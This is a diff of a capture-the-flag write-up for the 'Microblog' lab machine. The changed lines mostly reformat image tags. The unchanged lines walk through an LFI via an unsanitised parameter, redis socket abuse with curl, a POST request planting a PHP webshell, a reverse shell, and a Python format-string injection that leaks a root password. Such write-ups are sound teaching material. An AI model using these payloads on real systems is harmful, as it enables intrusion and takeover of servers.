@@ -22,27 +22,27 @@ We have to add `app.microblog.htb` and `microblog.htb` to our `/etc/hosts` file 
 
 Port 80 reveals a blogging service called Microblog:
 
-<figure><img src="../../.gitbook/assets/image (2075).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2075).png>)
 
 At the bottom, it appears that the website creates new blogs by using new subdomains.
 
-<figure><img src="../../.gitbook/assets/image (987).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(987).png>)
 
 By clicking on Contrubute Here, we are redirected to port 3000 that hosts a Gitea instance with some source code:
 
-<figure><img src="../../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(928).png>)
 
 Before going there, let's take a look at the rest of the website. After registering a user, it seems that we can 'create' a subdomain:
 
-<figure><img src="../../.gitbook/assets/image (611).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(611).png>)
 
 After creating one, we can edit it.
 
-<figure><img src="../../.gitbook/assets/image (1736).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1736).png>)
 
 Going to the edit page reveals that we can use h1 or txt.
 
-<figure><img src="../../.gitbook/assets/image (1242).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1242).png>)
 
 This would send a POST request to `/edit/index.php`:
 
@@ -70,7 +70,7 @@ id=02nc8ktv0kk4&txt=test
 
 When checking the application, it seems that we have a `sunny` subdomain.
 
-<figure><img src="../../.gitbook/assets/image (1049).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1049).png>)
 
 Witin the `sunny` directory, it seems that there is an `edit` function. The PHP code for this is pretty long, so let's break it down:
 
@@ -148,7 +148,7 @@ if (isset($_POST['header']) && isset($_POST['id'])) {
 
 In this case, it seems that the `id` parameter is directly passed into `fopen`, meaning this could be vulnerable to LFI. Earlier, we created a new blog which created a new subdomain, so let's test our vulnerability there and confirm that it works.
 
-<figure><img src="../../.gitbook/assets/image (810).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(810).png>)
 
 ```http
 POST /edit/index.php HTTP/1.1
@@ -233,7 +233,7 @@ curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.soc
 
 Afterwards, if we create a website, we notice that we can upload Images:
 
-<figure><img src="../../.gitbook/assets/image (2861).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2861).png>)
 
 Great! We are a Pro User and can upload files now. Since we are Pro, this chunk of code would be executed:
 
@@ -262,7 +262,6 @@ $html = "<div class = \"blog-h1 blue-fill\"><b>{$_POST['header']}</b></div>";
 
 The `header` parameter would have the contents of the PHP webshell, while the `id` parameter would have the full path of the file to be written since both are not sanitised. I used this HTTP request:
 
-{% code overflow="wrap" %}
 ```http
 POST /edit/index.php HTTP/1.1
 Host: test.microblog.htb
@@ -282,15 +281,14 @@ Upgrade-Insecure-Requests: 1
 
 id=/var/www/microblog/test/uploads/rev.php&txt=<%3fphp+system($_REQUEST['cmd'])%3b+%3f>
 ```
-{% endcode %}
 
 Afterwards, we can confirm we have RCE:
 
-<figure><img src="../../.gitbook/assets/image (3973).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3973).png>)
 
 And then we can get a reverse shell:
 
-<figure><img src="../../.gitbook/assets/image (3869).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3869).png>)
 
 ## Privilege Escalation
 
@@ -298,11 +296,11 @@ And then we can get a reverse shell:
 
 Within the machine, if we run `pspy64`, we would eventually see this:
 
-<figure><img src="../../.gitbook/assets/image (1554).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1554).png>)
 
 We can use these credentials to access the user via `ssh`.
 
-<figure><img src="../../.gitbook/assets/image (2015).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2015).png>)
 
 ### Format String -> Root Creds
 
@@ -435,7 +433,6 @@ gAAAAABkYMlBQ1sk9EvGPaPlcepxtmQ6D8BtGYtNPEaZc9LNhpxA-LukIBYhtHwGtmhKpPXrfM29ncr8
 
 I first tried to use HSET to insert a user of our own choosing:
 
-{% code overflow="wrap" %}
 ```
 redis /run/redis/redis.sock> HSET testuser username testing username {self.__init__.__globals__} password {self.__init__.__globals__} first-name {self.__init__.__globals__} last-name {self.__init__.__globals__} pro false
 (integer) 5
@@ -446,11 +443,9 @@ Traceback (most recent call last):
     license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
 KeyError: 'self'
 ```
-{% endcode %}
 
 We can see that this is making an error occur within the script. We can see that the `format()` function uses `license=l`, so we can use that to dump the script's global context out:
 
-{% code overflow="wrap" %}
 ```
 redis /run/redis/redis.sock> HSET ee username {license.__init__.__globals__} password test first-name test last-name test pro false
 (integer) 5
@@ -462,10 +457,9 @@ Plaintext license key:
 microblog{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f7d64b4fc10>
 <TRUNCATED>
 ```
-{% endcode %}
 
 Within this entire string is the `root` password of :`unCR4ckaBL3Pa$$w0rd`. We can then `su` to `root`.
 
-<figure><img src="../../.gitbook/assets/image (3194).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3194).png>)
 
 Rooted!
